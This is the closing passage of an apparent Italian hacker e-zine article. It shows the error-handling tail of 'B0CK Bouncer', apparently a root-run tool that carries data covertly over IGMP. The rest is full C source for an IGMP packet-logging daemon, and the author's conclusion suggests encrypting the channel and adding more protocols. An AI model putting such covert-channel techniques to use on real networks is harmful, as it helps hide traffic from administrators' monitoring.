+    case 1: perror("socket()"); break;
+    case 2: perror("sendto()"); break;
+    case 3: fprintf(stderr,"B0CK Bouncer required r00t rulez permission\n"); break;
+    case 4: perror("open()"); break;
+   }
+  exit(0);
+ }
+---------- snip ----------
+
+[5] * L O G G H I A M O ?
+
+Eh che brutta parola eh :) Comunque si da' il caso che e' possibile loggare
+l'igmp, NESSUNO LO FA', ok, o QUASI nessuno... cmq se volete vedere
+"dietro le quinte" cosa succede o cosa passa, vi sara' comodo un
+igmplogger. Io l'ho fatto prima ancora di iniziare il test (usare tcpdump
+non e' proprio bello :) e non l'avrei nemmeno allegato se non fosse che
+ntf me l'ha consigliato :)
+Il codice e' molto semplice ed e' tratto dall'icmplog (codato a sua volta a
+partire dal tcplogd di phroid); le variazioni che lo differenziano da questo
+sono il tipo di protocollo specificato nella funzione read(), la struttura ed
+i campi che vengono messi in evidenza nel logging.
+
+igmplog.c
+---------- snip ----------
+/*                     Igmplog version 1 by Vecna                       */ 
+/*                          coded 15.8.1999                             */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+#include <syslog.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <linux/ip.h>
+#include <netinet/igmp.h>
+
+char *hostlookup(unsigned long int);
+void new_bg(void);
+void init_sign(void);
+void killing(int);
+
+struct ippkt {
+  struct iphdr ip;
+  struct igmphdr igmp;
+  char buffer[1024];
+}pkt;
+
+            
+void new_bg(void) {
+  int ffork;
+
+  ffork=fork();
+  if(ffork < 0) {
+    perror("fork");
+    exit(1);
+  }
+  if(ffork > 0) exit(0);
+}
+
+void init_sign(void) {
+  signal(SIGINT, SIG_IGN);
+  signal(SIGTERM, killing);
+  signal(SIGKILL, killing);
+  signal(SIGQUIT, killing);
+  signal(SIGALRM, SIG_IGN);
+}
+   
+void killing(int s) {
+  syslog(LOG_NOTICE,"[%d] closed by signal[%d]",getpid(),s);
+  exit(0);
+}
+
+int main(void)
+  {
+  int s;
+  if(geteuid() != 0) {
+    printf("\nigmplogd required uid/euid = 0\n");
+    exit(0);
+  }
+  new_bg();
+  init_sign();
+  s=socket(AF_INET, SOCK_RAW, 2);
+  openlog("IGMPL0G", 0, LOG_DAEMON);
+  syslog(LOG_NOTICE, "IGMPLOG start [%d]", getpid());
+   
+  while(1) {
+    read(s, (struct ippkt *)&pkt, 1023);
+    syslog(LOG_NOTICE,"from %s IGMP type %d code %d", hostlookup(pkt.ip.saddr),pkt.igmp.type,pkt.igmp.code);
+  }
+}
+   
+char *hostlookup(unsigned long int in) {
+  static char blah[1024];
+  struct in_addr i;
+  struct hostent *he;
+        
+  i.s_addr=in;
+  he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);
+  if(he == NULL) strcpy(blah, inet_ntoa(i));
+  else strcpy(blah, he->h_name);
+  return blah;
+}
+---------- snip ----------
+
+Sebbene abbia una particolare repulsione, nell'ultimo periodo, agli
+igmplogger, allego questo codice sperando che nessun sysadmin pensi di
+metterlo sul suo serverino :)
+
+[6] * C O N C L U S I O N E
+
+Ora come ora questo programma funziona e mantiene le aspettative. Puo',
+come ogni cosa, essere migliorata, ad esempio crittanto i dati o utilizzando
+un numero superiore di protocolli di trasporto (un numero di protocollo
+maggiore comporta anche piu' read() attive ed un certo sincronismo tra
+client-server o segnali di riconoscimento nei paccheti, che indichi al
+sever/client di che tipo sara' il prossimo pacchetto. Questa pero' non si
+chiama paranoia, la paranoia si ferma un po' prima della pazzia :) 
+Ringrazio tutti quelli che hanno letto fino a qui, sperando che l'etto di
+prosciutto crudo non vi sia venuto su durante la lettura :D
+
+Bye                    [ minkia 31k di documento ]
+Vecna                 vecna@ircnet - vecna@mail.com
+
+
+==============================================================================
+--------------------------------[ EOF 12/22 ]---------------------------------
+==============================================================================
